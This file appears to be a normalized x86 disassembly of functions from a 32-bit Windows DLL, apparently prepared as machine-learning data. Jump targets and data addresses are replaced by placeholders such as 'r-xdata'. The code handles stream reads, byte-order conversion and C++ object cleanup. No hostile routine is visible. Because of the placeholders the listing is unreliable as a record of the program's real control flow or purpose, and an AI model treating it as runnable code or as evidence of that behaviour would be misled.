mov [ edx + ecx - 0x30 ] eax
mov [ ebp - 0x4 ] 0x1
lea ebx [ ecx - 0xc ]
mov edi [ ebx ]
mov esi [ edi ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ ebx ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x4 ] 0x0
cmp ecx [ ebx ]
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebx ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x10 ]
add esi 0xfffffff8
mov [ ebp - 0x14 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x10
jb r-xdata
lea esp [ esp ]
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi [ ecx ]
push ecx
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
cmp esi [ ebx ]
jne r-xdata
sub_10023ca0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10050058
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
lea ecx [ esp + 0xf ]
push 0x1
push ecx
push 0x0
mov eax [ esi ]
mov ecx esi
mov [ esp + 0x1b ] 0x0
call [ eax + 0x14 ]
cmp [ esp + 0xf ] 0xc
je r-xdata
lea ecx [ edi - 0x2c ]
call sub_10024060
test eax eax
je r-xdata
xor eax eax
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esp + 0x1c ] r--data
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x1c ] r--data
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x38 ] 0x1
push ecx
push esi
push eax
lea ecx [ esp + 0x28 ]
call sub_10024220
test eax eax
je r-xdata
xor esi esi
push 0x2
lea eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x24 ]
call [ eax + 0x4 ]
cmp eax 0x2
jne r-xdata
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
push [ esp + 0x10 ]
call [ ntohs@IAT ]
mov edi [ edi - 0xc ]
movzx edx ax
mov [ esp + 0x10 ] edx
mov esi [ edi ]
cmp esi edi
je r-xdata
mov [ esp + 0x38 ] 0xffffffff
mov eax esi
mov [ esp + 0x1c ] r--data
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
push 0x1
call [ edx ]
jmp r-xdata
mov ecx [ esi + 0x8 ]
push edx
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
push 0x8
lea eax [ esp + 0x18 ]
push eax
mov eax [ esp + 0x24 ]
lea ecx [ esp + 0x24 ]
call [ eax + 0x4 ]
cmp eax 0x8
jne r-xdata
mov esi [ esi ]
cmp esi edi
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call sub_1002c060
mov ecx [ esi + 0x8 ]
lea edi [ esp + 0x24 ]
add esp 0x8
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edx
mov esi [ ecx ]
push edi
push edx
push eax
call [ esi + 0x8 ]
mov esi eax
jmp r-xdata
mov edx [ esp + 0x10 ]
jmp r-xdata
mov [ esp + 0x38 ] 0xffffffff
mov [ esp + 0x1c ] r--data
mov [ esp + 0x38 ] 0x2
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
sub_10023e50
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10023ca0
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ ecx + 0x4 ]
mov eax [ eax + 0x4 ]
add eax 0x4
add eax ecx
pop ebp
retn 0x4
pop ebp
retn 0x4
sub_10023e90
push ebp
mov ebp esp
push 0xffffffff
push sub_1005008b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea edi [ ecx - 0x24 ]
mov eax [ edi ]
lea esi [ edi + 0x24 ]
mov [ ebp - 0x10 ] esi
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x10
jb r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov [ esi ] r--data
je r-xdata
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10023f30
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
lea eax [ esi - 0x4 ]
je r-xdata
pop esi
pop ebp
retn 0x4
push eax
call j_sub_1003f3e3#2
add esp 0x4
lea eax [ esi - 0x4 ]
sub_10023f60
push ebp
mov ebp esp
push 0xffffffff
push sub_100500bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x24 ]
mov [ edx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x8 ] 0x10
jb r-xdata
mov [ esi - 0x8 ] 0xf
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10023fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c3b8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov al [ ebp + 0x20 ]
mov [ ecx - 0x20 ] al
add ecx 0xffffffe4
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10024060
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e7f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov al [ edi + 0x4 ]
cmp al 0x71
jne r-xdata
cmp al 0x70
jne r-xdata
call sub_100070d0
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
call sub_10007010
mov esi eax
test esi esi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub esp 0x18
lea eax [ edi + 0x8 ]
mov ecx esp
mov [ ebp - 0x10 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call [ eax + 0x8 ]
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
sub_10024130
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e6c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100241b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e6c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10024220
push ebp
mov ebp esp
push 0xffffffff
push sub_10050128
mov eax [ fs : 0x0 ]
push eax
sub esp 0x438
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x434 ] edi
mov esi [ ebp + 0xc ]
mov ebx 0x1
mov eax [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x43c ] eax
mov [ edi + 0x4 ] eax
mov eax [ esi ]
call [ eax + 0xc ]
cmp eax 0x20000
jbe r-xdata
push 0x18
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x438 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
push 0x2c
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push 0x0
mov ecx eax
call sub_10037bc0
jmp r-xdata
xor eax eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
sub esp 0x18
mov edi esp
mov [ ebp - 0x440 ] esp
sub esp 0x18
mov ecx esp
mov [ ebp - 0x438 ] esp
push r--data
call sub_10001820
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_1003c0f0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x430 ]
call sub_1002b560
mov edi [ ebp - 0x434 ]
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0xc
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x430 ] 0x0
call [ eax + 0xc ]
cmp eax 0x1
jbe r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x14 ] 0x1
mov ecx eax
mov [ edi + 0x8 ] eax
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x414 ]
push 0x400
push ecx
push ebx
mov ecx esi
call [ eax + 0x14 ]
mov edi eax
test edi edi
je r-xdata
mov edx [ esi ]
mov ecx esi
add ebx edi
call [ edx + 0xc ]
cmp ebx eax
sbb eax eax
inc eax
push eax
sub esp 0x18
lea eax [ ebp - 0x414 ]
mov ecx esp
mov [ ebp - 0x438 ] esp
push edi
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x4
lea edx [ ebp - 0x42c ]
mov ecx [ ebp - 0x43c ]
push edx
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0xffffffff
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] 0x5
lea edx [ ebp - 0x42c ]
mov eax [ ebp - 0x434 ]
cmp [ ebp - 0x418 ] 0x10
push [ ebp - 0x41c ]
cmovae edx [ ebp - 0x42c ]
mov ecx [ eax + 0x8 ]
mov edi [ ebp - 0x430 ]
push edx
push edi
mov eax [ ecx ]
call [ eax + 0x10 ]
add edi eax
mov [ ebp - 0x430 ] edi
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x418 ] 0x10
jb r-xdata
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x418 ] 0xf
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x42c ] 0x0
call [ eax + 0xc ]
cmp ebx eax
jb r-xdata
push [ ebp - 0x42c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10024480
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push [ esi + 0xc ]
mov eax [ ecx ]
call [ eax + 0x14 ]
add [ esi + 0xc ] eax
pop esi
pop ebp
retn 0x8
sub_100244c0
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push 0x2
push esi
call [ eax + 0x4 ]
cmp eax 0x2
je r-xdata
movzx eax [ esi ]
push eax
call [ ntohs@IAT ]
mov [ esi ] ax
mov eax 0x1
pop esi
pop ebp
retn 0x4
xor eax eax
pop esi
pop ebp
retn 0x4
sub_10024500
push ebp
mov ebp esp
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push 0x4
push esi
call [ eax + 0x4 ]
cmp eax 0x4
je r-xdata
push [ esi ]
call [ ntohl@IAT ]
mov [ esi ] eax
mov eax 0x1
pop esi
pop ebp
retn 0x4
xor eax eax
pop esi
pop ebp
retn 0x4
sub_10024530
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
push 0x8
push esi
call [ eax + 0x4 ]
cmp eax 0x8
je r-xdata
push [ esi + 0x4 ]
push [ esi ]
call sub_1002c060
add esp 0x8
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x4
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10024570
push ebp
mov ebp esp
push 0xffffffff
push sub_10050158
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov eax [ edi ]
lea ecx [ ebp - 0x2c ]
mov ebx [ ebp + 0x8 ]
push ecx
mov ecx edi
mov [ ebp - 0x2c ] 0x0
call [ eax + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x2c ]
cmp eax 0x1000000
ja r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_1003c61a
mov esi eax
add esp 0x4
test esi esi
je r-xdata
push [ ebp - 0x2c ]
mov eax [ edi ]
mov ecx edi
push esi
call [ eax + 0x4 ]
mov ecx [ ebp - 0x2c ]
cmp ecx eax
je r-xdata
push ecx
mov [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x0
push esi
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
mov ecx ebx
call sub_10018bc0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_10001880
push esi
call j_sub_1003f3e3
add esp 0x4
mov eax 0x1
push esi
call j_sub_1003f3e3
add esp 0x4
sub_10024680
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_100246b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100501c2
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0x0
mov [ edi ] r--data
mov [ edi + 0x1c ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov [ ebp - 0x10 ] 0x1
mov eax [ eax + 0x4 ]
mov [ edi + eax ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edi - 0x4 ] eax
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
mov [ edi + 0xc ] 0x0
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x10 ]
push 0x0
push 0x0
mov [ ebp - 0x18 ] esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call sub_10019b80
mov [ esi ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10024770
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x1c ]
lea ecx [ edi + 0x1c ]
call sub_100247a0
test [ ebp + 0x8 ] 0x1
mov [ edi + 0x1c ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_100247a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10050206
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x10 ] ebx
mov eax [ ebx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + ebx - 0x1c ] r--data
mov eax [ ebx - 0x1c ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x1c ]
mov [ edx + ebx - 0x20 ] eax
mov [ ebp - 0x4 ] 0x1
mov edi [ ebx - 0x14 ]
mov esi [ ebx - 0x18 ]
cmp esi edi
je r-xdata
mov eax [ ebx - 0x18 ]
mov [ ebx - 0x14 ] eax
add ebx 0xfffffff4
mov edi [ ebx ]
mov esi [ edi ]
cmp esi edi
je r-xdata
lea esp [ esp ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ ebx ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x4 ] 0x0
cmp ecx [ ebx ]
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
add esi 0x4
cmp esi edi
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x4 ] 0x0
push [ ebx ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x10 ]
mov eax [ esi - 0x18 ]
test eax eax
je r-xdata
mov esi [ ecx ]
push ecx
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
cmp esi [ ebx ]
jne r-xdata
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x18 ] 0x0
mov [ esi - 0x14 ] 0x0
mov [ esi - 0x10 ] 0x0
sub_100248c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e9e0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov edi [ ecx - 0xc ]
mov esi [ edi ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push [ ebp + 0x20 ]
mov ebx [ esi + 0x8 ]
lea eax [ ebp + 0x8 ]
sub esp 0x18
mov ecx esp
mov [ ebp - 0x10 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx ]
mov [ ebp - 0x4 ] 0x0
mov ecx ebx
call [ eax + 0x8 ]
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10024980
push ebp
mov ebp esp
push 0xffffffff
push sub_10050256
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
cmp [ rw-data ] 0x0
jne r-xdata
mov esi [ ebp + 0x8 ]
mov ebx [ rw-data ]
cmp esi 0x20000
jbe r-xdata
mov ecx 0x58
call sub_100382c0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
push 0x18
call sub_1003cdeb
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
push 0x2c
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
test edi edi
je r-xdata
xor esi esi
push esi
mov ecx eax
call sub_10037bc0
mov esi eax
jmp r-xdata
xor esi esi
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
jmp r-xdata
push 0x0
sub esp 0x18
mov esi esp
mov [ ebp - 0x14 ] esp
sub esp 0x18
mov ecx esp
mov [ ebp - 0x18 ] esp
push ebx
call sub_10001820
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_1003c0f0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_1002b560
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
push eax
lea ecx [ edi - 0x18 ]
call sub_10024c40
mov eax [ ebp + 0xc ]
mov [ eax ] esi
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
test eax eax
jne r-xdata
sub_10024ad0
push ebp
mov ebp esp
mov eax [ ecx - 0x18 ]
mov ecx [ ecx - 0x14 ]
cmp eax ecx
je r-xdata
xor eax eax
pop ebp
retn 0x10
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ecx ]
push [ ebp + 0xc ]
call [ eax + 0x10 ]
pop ebp
retn 0x10
add eax 0x4
cmp eax ecx
jne r-xdata
cmp [ eax ] edx
je r-xdata
sub_10024b10
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ecx - 0x14 ]
push ebx
mov ebx [ ecx - 0x18 ]
mov [ ebp - 0x4 ] ecx
cmp ebx eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov edx [ ebx ]
push esi
push edi
mov edi [ ecx - 0xc ]
mov [ ebp - 0x8 ] edx
mov esi [ edi ]
cmp esi edi
je r-xdata
add ebx 0x4
cmp ebx eax
jne r-xdata
mov [ ebp + 0x8 ] 0x0
jmp r-xdata
cmp [ ebx ] edx
je r-xdata
mov ecx [ ebp - 0x4 ]
lea eax [ ebx + 0x4 ]
xor edx edx
xor esi esi
mov ecx [ ecx - 0x14 ]
mov edi ecx
sub edi eax
add edi 0x3
shr edi 0x2
cmp eax ecx
cmova edi edx
test edi edi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi + 0x8 ]
push edx
mov eax [ ecx ]
call [ eax + 0x4 ]
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add [ eax - 0x14 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
lea esp [ esp ]
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov esi [ esi ]
mov edx [ ebp - 0x8 ]
cmp esi edi
jne r-xdata
mov ecx [ ebx + 0x4 ]
lea ebx [ ebx + 0x4 ]
inc esi
mov [ ebx - 0x4 ] ecx
cmp esi edi
jne r-xdata
sub_10024bd0
push ebp
mov ebp esp
push ebx
mov ebx ecx
push esi
mov esi [ ebx - 0x18 ]
mov eax [ ebx - 0x14 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
cmp esi eax
jne r-xdata
push edi
mov edi [ ebx - 0x14 ]
lea eax [ esi + 0x4 ]
sub edi eax
xor edx edx
add edi 0x3
shr edi 0x2
cmp eax [ ebx - 0x14 ]
cmova edi edx
test edi edi
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp [ esi ] edx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
add [ ebx - 0x14 ] 0xfffffffc
pop edi
lea esp [ esp ]
mov eax [ esi + 0x4 ]
lea esi [ esi + 0x4 ]
inc edx
mov [ esi - 0x4 ] eax
cmp edx edi
jne r-xdata
sub_10024c40
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b881
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
